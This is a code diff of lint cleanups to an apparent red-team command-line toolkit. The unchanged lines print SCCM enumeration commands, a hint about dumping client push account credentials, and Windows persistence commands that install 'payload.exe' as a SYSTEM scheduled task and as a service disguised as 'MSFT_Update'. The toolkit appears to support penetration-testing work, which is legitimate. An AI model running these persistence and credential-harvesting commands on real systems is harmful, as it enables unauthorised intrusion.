@@ -2252,7 +2252,6 @@ def cmd_doctor(args):
 
         if actions:
             print("\nfix actions:")
-            marker = {"fixed": "fixed  "}
             for a, o in actions:
                 m = "fixed  " if o == "fixed" else \
                     ("skipped" if o.startswith("skipped") else "FAILED ")
@@ -2469,8 +2468,8 @@ def cmd_engagements_list(args):
     if active:
         print(f"\n▸ = active engagement (via ${DB_ENV_VAR})")
     else:
-        print(f"\nno active engagement — "
-              f"`fieldkit engagements switch <path>` prints the export line")
+        print("\nno active engagement — "
+              "`fieldkit engagements switch <path>` prints the export line")
     return 0
 
 
@@ -2711,11 +2710,11 @@ def cmd_sccm_enum(args, store):
     _ = args, store
     print("SCCM/MECM enum + attack paths:\n")
     print("=== Enum management points (MPs) + distribution points (DPs) ===")
-    print(f"  # LDAP query for SystemManagement container:")
+    print("  # LDAP query for SystemManagement container:")
     print(f"  ldapsearch -H ldap://<dc> -b 'CN=System Management,"
           f"CN=System,DC={domain.replace('.', ',DC=')}' -s sub")
-    print(f"  # Or via SharpSCCM (needs a domain cred):")
-    print(f"  SharpSCCM.exe get site-info -sms <MP-hostname>")
+    print("  # Or via SharpSCCM (needs a domain cred):")
+    print("  SharpSCCM.exe get site-info -sms <MP-hostname>")
     print()
     print("=== Client push accounts (CPA) — often broad local admin ===")
     print("  # If the SCCM server was owned, dump the CPA creds from:")
@@ -2769,7 +2768,7 @@ def cmd_persist(args, store):
     if plat in ("windows", "both"):
         print("=== Windows: scheduled task (SYSTEM if run as admin) ===")
         print("  schtasks /Create /TN 'MSFT_Update' /TR "
-              f"'C:\\Windows\\Temp\\payload.exe' /SC ONSTART /RU SYSTEM /F")
+              "'C:\\Windows\\Temp\\payload.exe' /SC ONSTART /RU SYSTEM /F")
         print("=== Windows: service (SYSTEM, persistent across reboot) ===")
         print("  sc.exe create MSFT_Update binPath= 'C:\\Windows\\Temp\\payload.exe'")
         print("  sc.exe config MSFT_Update start= auto")
@@ -3100,7 +3099,6 @@ def cmd_chain_unregister(args):
     ~/.fieldkit/chains/. Only affects user-installed profiles;
     shipped profiles can't be removed via this command."""
     from . import chain_yaml
-    from . import chain as chain_mod
     shipped = {"esc8", "rbcd", "smb-relay-exec", "esc1", "nopac"}
     if args.name in shipped:
         _err(f"{args.name!r} is a shipped profile — can't unregister")
